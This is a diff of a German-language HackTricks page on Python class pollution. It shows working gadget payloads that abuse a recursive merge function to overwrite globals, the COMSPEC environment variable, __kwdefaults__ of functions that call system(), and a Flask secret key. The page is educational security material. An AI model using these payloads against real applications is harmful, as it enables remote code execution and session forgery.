@@ -1,23 +1,23 @@
-# Class Pollution (Python's Prototype Pollution)
+# Klassenverschmutzung (Python's Prototypenverschmutzung)
+
+{% hint style="success" %}
+Lernen Sie AWS-Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
+Lernen Sie GCP-Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)
 
 <details>
 
-<summary><strong>Lernen Sie AWS-Hacking von Grund auf mit</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>
+<summary>Unterstützen Sie HackTricks</summary>
 
-Andere Möglichkeiten, HackTricks zu unterstützen:
-
-* Wenn Sie Ihr **Unternehmen in HackTricks bewerben möchten** oder **HackTricks als PDF herunterladen möchten**, überprüfen Sie die [**ABONNEMENTPLÄNE**](https://github.com/sponsors/carlospolop)!
-* Holen Sie sich das [**offizielle PEASS & HackTricks-Merchandise**](https://peass.creator-spring.com)
-* Entdecken Sie [**The PEASS Family**](https://opensea.io/collection/the-peass-family), unsere Sammlung exklusiver [**NFTs**](https://opensea.io/collection/the-peass-family)
+* Überprüfen Sie die [**Abonnementpläne**](https://github.com/sponsors/carlospolop)!
 * **Treten Sie der** 💬 [**Discord-Gruppe**](https://discord.gg/hRep4RUj7f) oder der [**Telegram-Gruppe**](https://t.me/peass) bei oder **folgen** Sie uns auf **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
-* **Teilen Sie Ihre Hacking-Tricks, indem Sie PRs an die** [**HackTricks**](https://github.com/carlospolop/hacktricks) und [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) GitHub-Repositories senden.
+* **Teilen Sie Hacking-Tricks, indem Sie PRs an die** [**HackTricks**](https://github.com/carlospolop/hacktricks) und [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) Github-Repositorys senden.
 
 </details>
+{% endhint %}
 
 ## Grundlegendes Beispiel
 
-Überprüfen Sie, wie es möglich ist, Klassen von Objekten mit Zeichenketten zu verschmutzen:
-
+Überprüfen Sie, wie es möglich ist, Klassen von Objekten mit Zeichenfolgen zu verschmutzen:
 ```python
 class Company: pass
 class Developer(Company): pass
@@ -41,51 +41,7 @@ e.__class__.__base__.__base__.__qualname__ = 'Polluted_Company'
 print(d) #<__main__.Polluted_Developer object at 0x1041d2b80>
 print(c) #<__main__.Polluted_Company object at 0x1043a72b0>
 ```
-
 ## Grundlegendes Beispiel für eine Schwachstelle
-
-Consider the following Python code:
-
-Betrachten Sie den folgenden Python-Code:
-
-```python
-class Person:
-    def __init__(self, name):
-        self.name = name
-
-person = Person("Alice")
-print(person.name)
-
-Person.__init__ = lambda self, name: None
-
-print(person.name)
-```
-
-In this code, we have a `Person` class with an `__init__` method that initializes the `name` attribute. We create an instance of the `Person` class called `person` and print the value of the `name` attribute.
-
-In diesem Code haben wir eine `Person`-Klasse mit einer `__init__`-Methode, die das `name`-Attribut initialisiert. Wir erstellen eine Instanz der `Person`-Klasse namens `person` und geben den Wert des `name`-Attributs aus.
-
-However, in the next line, we modify the `__init__` method of the `Person` class to a lambda function that does nothing. We then print the value of the `name` attribute again.
-
-Jedoch ändern wir in der nächsten Zeile die `__init__`-Methode der `Person`-Klasse zu einer Lambda-Funktion, die nichts tut. Anschließend geben wir den Wert des `name`-Attributs erneut aus.
-
-The output of this code will be:
-
-Die Ausgabe dieses Codes wird sein:
-
-```
-Alice
-None
-```
-
-As we can see, after modifying the `__init__` method, the value of the `name` attribute becomes `None`, even though we didn't explicitly change it.
-
-Wie wir sehen können, wird nach der Modifikation der `__init__`-Methode der Wert des `name`-Attributs zu `None`, obwohl wir ihn nicht explizit geändert haben.
-
-This is an example of class pollution or prototype pollution vulnerability in Python. By modifying a class's methods or attributes, an attacker can introduce unexpected behavior or modify the state of an object without the knowledge or consent of the original code.
-
-Dies ist ein Beispiel für eine Klassenverunreinigung oder Prototypenverunreinigung in Python. Durch die Modifikation von Methoden oder Attributen einer Klasse kann ein Angreifer unerwartetes Verhalten einführen oder den Zustand eines Objekts ohne das Wissen oder die Zustimmung des ursprünglichen Codes ändern.
-
 ```python
 # Initial state
 class Employee: pass
@@ -118,36 +74,57 @@ USER_INPUT = {
 merge(USER_INPUT, emp)
 print(vars(emp)) #{'name': 'Ahemd', 'age': 23, 'manager': {'name': 'Sarah'}}
 ```
-
 ## Beispiele für Gadgets
 
 <details>
 
-<summary>Erstellen eines Klassenattribut-Standardwerts für RCE (subprocess)</summary>
+<summary>Erstellen eines Klassenattribut-Standardwerts für RCE (Unterprozess)</summary>
+```python
+from os import popen
+class Employee: pass # Creating an empty class
+class HR(Employee): pass # Class inherits from Employee class
+class Recruiter(HR): pass # Class inherits from HR class
 
-\`\`\`python from os import popen class Employee: pass # Creating an empty class class HR(Employee): pass # Class inherits from Employee class class Recruiter(HR): pass # Class inherits from HR class
-
-class SystemAdmin(Employee): # Class inherits from Employee class def execute\_command(self): command = self.custom\_command if hasattr(self, 'custom\_command') else 'echo Hello there' return f'\[!] Executing: "{command}", output: "{popen(command).read().strip()}"'
+class SystemAdmin(Employee): # Class inherits from Employee class
+def execute_command(self):
+command = self.custom_command if hasattr(self, 'custom_command') else 'echo Hello there'
+return f'[!] Executing: "{command}", output: "{popen(command).read().strip()}"'
 
 def merge(src, dst):
+# Recursive merge function
+for k, v in src.items():
+if hasattr(dst, '__getitem__'):
+if dst.get(k) and type(v) == dict:
+merge(v, dst.get(k))
+else:
+dst[k] = v
+elif hasattr(dst, k) and type(v) == dict:
+merge(v, getattr(dst, k))
+else:
+setattr(dst, k, v)
 
-## Recursive merge function
+USER_INPUT = {
+"__class__":{
+"__base__":{
+"__base__":{
+"custom_command": "whoami"
+}
+}
+}
+}
 
-for k, v in src.items(): if hasattr(dst, '**getitem**'): if dst.get(k) and type(v) == dict: merge(v, dst.get(k)) else: dst\[k] = v elif hasattr(dst, k) and type(v) == dict: merge(v, getattr(dst, k)) else: setattr(dst, k, v)
+recruiter_emp = Recruiter()
+system_admin_emp = SystemAdmin()
 
-USER\_INPUT = { "**class**":{ "**base**":{ "**base**":{ "custom\_command": "whoami" } } } }
+print(system_admin_emp.execute_command())
+#> [!] Executing: "echo Hello there", output: "Hello there"
 
-recruiter\_emp = Recruiter() system\_admin\_emp = SystemAdmin()
+# Create default value for Employee.custom_command
+merge(USER_INPUT, recruiter_emp)
 
-print(system\_admin\_emp.execute\_command()) #> \[!] Executing: "echo Hello there", output: "Hello there"
-
-## Create default value for Employee.custom\_command
-
-merge(USER\_INPUT, recruiter\_emp)
-
-print(system\_admin\_emp.execute\_command()) #> \[!] Executing: "whoami", output: "abdulrah33m"
-
-````
+print(system_admin_emp.execute_command())
+#> [!] Executing: "whoami", output: "abdulrah33m"
+```
 </details>
 
 <details>
@@ -179,12 +156,129 @@ merge({'__class__':{'__init__':{'__globals__':{'not_accessible_variable':'Pollut
 
 print(not_accessible_variable) #> Polluted variable
 print(NotAccessibleClass) #> <class '__main__.PollutedClass'>
-````
+```
+</details>
+
+<details>
+
+<summary>Beliebige Unterprozessausführung</summary>
+```python
+import subprocess, json
+
+class Employee:
+def __init__(self):
+pass
+
+def merge(src, dst):
+# Recursive merge function
+for k, v in src.items():
+if hasattr(dst, '__getitem__'):
+if dst.get(k) and type(v) == dict:
+merge(v, dst.get(k))
+else:
+dst[k] = v
+elif hasattr(dst, k) and type(v) == dict:
+merge(v, getattr(dst, k))
+else:
+setattr(dst, k, v)
+
+# Overwrite env var "COMSPEC" to execute a calc
+USER_INPUT = json.loads('{"__init__":{"__globals__":{"subprocess":{"os":{"environ":{"COMSPEC":"cmd /c calc"}}}}}}') # attacker-controlled value
+
+merge(USER_INPUT, Employee())
+
+subprocess.Popen('whoami', shell=True) # Calc.exe will pop up
+```
+</details>
+
+<details>
+
+<summary>Überschreiben von <strong><code>__kwdefaults__</code></strong></summary>
+
+**`__kwdefaults__`** ist ein spezielles Attribut aller Funktionen, basierend auf der Python-[Dokumentation](https://docs.python.org/3/library/inspect.html), es handelt sich um eine "Zuordnung von Standardwerten für **nur-Schlüsselwort**-Parameter". Durch das Verunreinigen dieses Attributs können wir die Standardwerte von nur-Schlüsselwort-Parametern einer Funktion kontrollieren, dies sind die Parameter der Funktion, die nach \* oder \*args kommen.
+```python
+from os import system
+import json
+
+def merge(src, dst):
+# Recursive merge function
+for k, v in src.items():
+if hasattr(dst, '__getitem__'):
+if dst.get(k) and type(v) == dict:
+merge(v, dst.get(k))
+else:
+dst[k] = v
+elif hasattr(dst, k) and type(v) == dict:
+merge(v, getattr(dst, k))
+else:
+setattr(dst, k, v)
+
+class Employee:
+def __init__(self):
+pass
+
+def execute(*, command='whoami'):
+print(f'Executing {command}')
+system(command)
+
+print(execute.__kwdefaults__) #> {'command': 'whoami'}
+execute() #> Executing whoami
+#> user
+
+emp_info = json.loads('{"__class__":{"__init__":{"__globals__":{"execute":{"__kwdefaults__":{"command":"echo Polluted"}}}}}}') # attacker-controlled value
+merge(emp_info, Employee())
+
+print(execute.__kwdefaults__) #> {'command': 'echo Polluted'}
+execute() #> Executing echo Polluted
+#> Polluted
+```
+</details>
+
+<details>
+
+<summary>Überschreiben des Flask-Secrets über Dateien hinweg</summary>
+
+Also, wenn Sie eine Klassenverunreinigung über ein Objekt durchführen können, das in der Haupt-Python-Datei der Website definiert ist, **dessen Klasse jedoch in einer anderen Datei definiert ist** als die Hauptdatei. Da Sie in den vorherigen Payloads auf \_\_globals\_\_ zugreifen müssen, um auf die Klasse des Objekts oder die Methoden der Klasse zuzugreifen, werden Sie in der Lage sein, **die globals in dieser Datei zu erreichen, aber nicht in der Hauptdatei**. \
+Daher werden Sie **nicht in der Lage sein, auf das Flask-App-Globalobjekt zuzugreifen**, das den **Geheimschlüssel** auf der Hauptseite definiert hat:
+```python
+app = Flask(__name__, template_folder='templates')
+app.secret_key = '(:secret:)'
+```
+In diesem Szenario benötigen Sie ein Gadget, um Dateien zu durchsuchen, um zur Hauptdatei zu gelangen, um auf das globale Objekt `app.secret_key` zuzugreifen, um den Flask Secret Key zu ändern und in der Lage zu sein, [Berechtigungen zu eskalieren, wenn Sie diesen Schlüssel kennen](../../network-services-pentesting/pentesting-web/flask.md#flask-unsign).
+
+Ein Payload wie dieser [aus diesem Writeup](https://ctftime.org/writeup/36082):
+
+{% code overflow="wrap" %}
+```python
+__init__.__globals__.__loader__.__init__.__globals__.sys.modules.__main__.app.secret_key
+```
+{% endcode %}
+
+Verwenden Sie dieses Payload, um **`app.secret_key`** (der Name in Ihrer App könnte unterschiedlich sein) zu ändern, um neue und privilegierte Flask-Cookies signieren zu können.
+
+</details>
 
 Überprüfen Sie auch die folgende Seite für weitere schreibgeschützte Gadgets:
 
-### Referenzen
+{% content-ref url="python-internal-read-gadgets.md" %}
+[python-internal-read-gadgets.md](python-internal-read-gadgets.md)
+{% endcontent-ref %}
+
+## Referenzen
 
 * [https://blog.abdulrah33m.com/prototype-pollution-in-python/](https://blog.abdulrah33m.com/prototype-pollution-in-python/)
 
+{% hint style="success" %}
+Lernen Sie & üben Sie AWS-Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
+Lernen Sie & üben Sie GCP-Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)
+
+<details>
+
+<summary>Unterstützen Sie HackTricks</summary>
+
+* Überprüfen Sie die [**Abonnementpläne**](https://github.com/sponsors/carlospolop)!
+* **Treten Sie der** 💬 [**Discord-Gruppe**](https://discord.gg/hRep4RUj7f) oder der [**Telegram-Gruppe**](https://t.me/peass) bei oder **folgen** Sie uns auf **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
+* **Teilen Sie Hacking-Tricks, indem Sie PRs an die** [**HackTricks**](https://github.com/carlospolop/hacktricks) und [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) GitHub-Repositories einreichen.
+
 </details>
+{% endhint %}
